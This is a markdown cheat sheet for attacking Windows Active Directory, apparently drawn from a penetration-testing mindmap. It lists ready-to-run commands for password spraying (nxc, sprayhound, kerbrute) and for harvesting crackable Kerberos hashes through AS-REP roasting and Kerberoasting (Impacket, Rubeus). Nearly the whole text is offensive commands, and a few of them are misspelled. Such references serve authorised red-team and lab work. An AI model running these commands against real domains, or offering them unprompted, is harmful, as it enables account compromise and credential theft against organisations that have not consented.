Technical notes for  of Windows Active Directory environments, extracted from [orange-cyberdefense](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg).


---
## Password Spray

**Purpose:** test a small set of passwords across many accounts (or user\==password checks) while avoiding account lockouts; collect any cleartext credential successes.

### Get password policy (do this before testing)

- Avoid account lockouts and respect FGPP.

```bash
# Obtain password policy with netexec
nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol

# Default domain policy (via PowerShell or domain-aware tools)
Get-ADDefaultDomainPasswordPolicy

# LDAP (domain policy)
ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy

# Fine-grained (PSO) policies
ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso
Get-ADFineGrainedPasswordPolicy -Filter *
```


### user == password checks (lab/CTF)

```bash
# nxc: user list vs single password (user==pass via spray tool flags)
nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success

# sprayhound user==pass mode
sprayhound -U <users.txt> -d <domain> -dc <dc_ip>   # add flags (--lower/--upper) as needed
```

### Common password spraying (few common passwords, many users)

- Typical passwords: SeasonYear!, Company123, Welcome123, etc.
```bash
# sprayhound with one password
sprayhound -U <users.txt> -p <password> -d <domain> -dc <dc_ip>

# kerbrute password spray
kerbrute passwordspray -d <domain> <users.txt> <password>

# nxc mass auth with continue-on-success
nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success
```


---

## ASREP Roast & Kerberoast (Valid-User, No-Password)

The purpose is obtaining crackable Kerberos material (AS-REP or TGS) for accounts without pre-auth or for SPN service accounts. Works with valid usernames (or user lists) without initial plaintext passwords.

### List ASREP-roastable users

- Query via BloodHound or LDAP attributes:
```bash
# BloodHound (Neo4j)
MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u
```

### AS-REP Roasting (accounts that do not require preauth)
- Request AS-REP and extract data for offline cracking.

```bash
# Impacket: GetNPUsers (hashcat format)
GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat -outputfile output.txt

# Impacket via nxc (if supported)
nxc ldap <dc_ip> -u <users.txt> -p '' --asreproast <output.txt>

# Rubeus (Windows)
Rubeus.exe asreproast /format:hashcat
```

### Kerberoasting (SPN / service account TGS)

- Request TGS for SPN-bearing service accounts and crack offline.

```bash
# Impacket: GetUserSPNs (no-preauth / SPN request)
GetUserSPNs.py -no-preauth "<asrep_user>" -usersfile "<user_list.txt>" -dc-host "<dc_ip>" "<domain>/"

# Rubeus keberoast (Windows)
Rubeus.exe keberoast /domain:<domain> /dc:<dc_ip> /nopreauth:<asrep_user> /spns:<users.txt>

# Targeted tool example
targetedKerberoast.py -u <user> -p <password> -d <domain> -t "<SPN>" --dc-ip <dc_ip>
```
